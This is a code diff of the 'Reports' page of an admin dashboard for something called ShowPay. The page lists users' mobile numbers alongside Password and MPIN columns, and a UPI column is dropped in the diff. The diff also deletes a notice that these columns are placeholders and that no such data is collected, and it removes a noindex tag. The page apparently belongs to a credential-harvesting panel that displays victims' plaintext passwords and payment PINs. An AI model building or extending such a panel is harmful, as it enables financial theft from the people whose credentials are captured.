@@ -3,9 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="noindex, nofollow, noarchive" />
     <title>Reports - ShowPay Admin</title>
-    <link rel="icon" type="image/png" href="/showpay-logo.png" />
     <link rel="stylesheet" href="../css/admin.css" />
     <script src="https://unpkg.com/lucide@0.511.0/dist/umd/lucide.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
@@ -55,7 +53,7 @@
               <i data-lucide="search" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #6b7280; width: 16px; height: 16px;"></i>
             </div>
             <div class="flex items-center" style="gap: 12px; cursor: pointer">
-              <img src="/showpay-logo.png" alt="Admin" style="width: 36px; height: 36px; border-radius: 50%" />
+              <img src="https://ui-avatars.com/api/?name=Admin&background=random" alt="Admin" style="width: 36px; height: 36px; border-radius: 50%" />
               <div class="admin-profile-text">
                 <div style="font-size: 14px; font-weight: 600">Admin</div>
                 <div style="font-size: 12px; color: #6b7280">Super Admin</div>
@@ -113,9 +111,6 @@
                 <button id="downloadCsvReportBtn" class="admin-btn" style="width: auto; padding: 8px 16px; background: #8b5cf6;">Download CSV</button>
               </div>
             </div>
-            <div style="margin: 0 0 12px; padding: 10px 12px; border-radius: 8px; background: #eff6ff; color: #475569; font-size: 12px;">
-              Sensitive columns are UI placeholders only. No password, MPIN or UPI data is collected.
-            </div>
             <div class="table-responsive">
             <table>
               <thead>
@@ -123,11 +118,9 @@
                   <th>Mobile</th>
                   <th>Password</th>
                   <th>MPIN</th>
-                  <th>UPI</th>
-                  <th>Login Count</th>
-                  <th>Login Date &amp; Time</th>
                   <th>Status</th>
-                  <th>Completed At</th>
+                  <th>Login Count</th>
+                  <th>Date</th>
                 </tr>
               </thead>
               <tbody id="reportTableBody"></tbody>
@@ -136,7 +129,9 @@
           </div>
         </div>
       </main>
-    </div>    <script type="module" src="../js/auth.js"></script>
+    </div>
+    <script type="module" src="../../user-app/js/config/supabase.js"></script>
+    <script type="module" src="../js/auth.js"></script>
     <script type="module" src="../js/reports.js"></script>
     <script>lucide.createIcons();</script>
     <script type="module" src="../js/sidebar.js"></script>
